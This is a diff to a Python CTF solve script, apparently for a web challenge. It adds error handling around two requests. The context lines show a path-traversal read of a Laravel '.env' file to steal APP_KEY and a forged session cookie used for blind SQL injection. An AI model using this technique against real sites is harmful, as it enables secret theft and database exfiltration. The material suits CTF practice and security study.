@@ -41,7 +41,11 @@ class cookie_bsqli:
 		self.exfil_data = {}
 
 	def __get_key(self):
-		self.session.get(BASE_URL)
+		try:
+			self.session.get(BASE_URL)
+		except ConnectionResetError as e:
+			print('Error sending GET request to CTF server:', e)
+			exit(1)
 		env_data = self.session.get(BASE_URL+'assets../.env').text
 		key_pattern = 'APP_KEY=base64:'
 		app_key_start = env_data.find(key_pattern)+len(key_pattern)
@@ -128,7 +132,11 @@ class cookie_bsqli:
 		Now set the current session cookie's to our injected cookie + nginxatsu_session
 		"""
 		self.session.cookies.set(self.cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
-		r = self.session.get(BASE_URL+'api/configs/')
+		try:
+			r = self.session.get(BASE_URL+'api/configs/')
+		except ConnectionResetError as e:
+			print('Error sending payload/GET request to CTF server:', e)
+			exit(1)
 		if r.status_code == 200 and ch:
 			if type(ch) == int:
 				found_ch = chr(ch)
